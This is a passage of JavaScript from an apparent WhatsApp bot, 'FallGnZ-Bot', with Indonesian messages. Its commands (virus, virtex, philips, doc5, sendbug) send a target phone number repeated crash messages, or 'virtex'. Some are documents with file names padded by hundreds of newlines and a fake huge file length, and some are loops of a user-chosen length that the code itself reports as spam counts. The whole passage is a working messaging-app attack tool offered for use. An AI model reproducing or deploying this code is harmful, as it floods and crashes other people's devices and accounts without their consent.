conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
mentions(`Sukses Send ${prefix+command} To @${num.split('@')[0]}, Jumlah Spam : 4`, [num])
}
break
case 'doc5':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
mentions(`Sukses Send ${prefix+command} To @${num.split('@')[0]}, Jumlah Spam : 5`, [num])
}
break

case 'philips':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim philips to @${num.split('@')[0]}`, [num])
}
break
case 'philips2':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'philips3':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'philips4':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'philips5':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virus1':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virus}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virus2':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virus}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virus3':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virus}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virus4':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virus}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virus5':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virus}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virtex1':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virtex(prefix)}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virtex2':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virtex(prefix)}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virtex3':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virtex(prefix)}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virtex4':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virtex(prefix)}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break
case 'virtex5':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '6285173226065@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
var bakso_kon = `𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virtex(prefix)}`
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
conn.sendMessage(num, {text:bakso_kon}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
}
break

case 'sendbug1':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(num, {text:`𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virtex(prefix)}`}, {quoted:virusnya})
await sleep(1000)
}
mentions(`Sukses *${command}* to @${num.split('@')[0]} jumlah spam : ${jumlah}`, [num])
}
break
case 'sendbug2':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(num, {text:`𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${virus}`}, {quoted:virusnya})
await sleep(1000)
}
mentions(`Sukses *${command}* to @${num.split('@')[0]} jumlah spam : ${jumlah}`, [num])
}
break
case 'sendbug3':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(num, {text:`𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ${philips}`}, {quoted:virusnya})
await sleep(1000)
}
mentions(`Sukses *${command}* to @${num.split('@')[0]} jumlah spam : ${jumlah}`, [num])
}
break

// GROUP
case 'hidetag':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
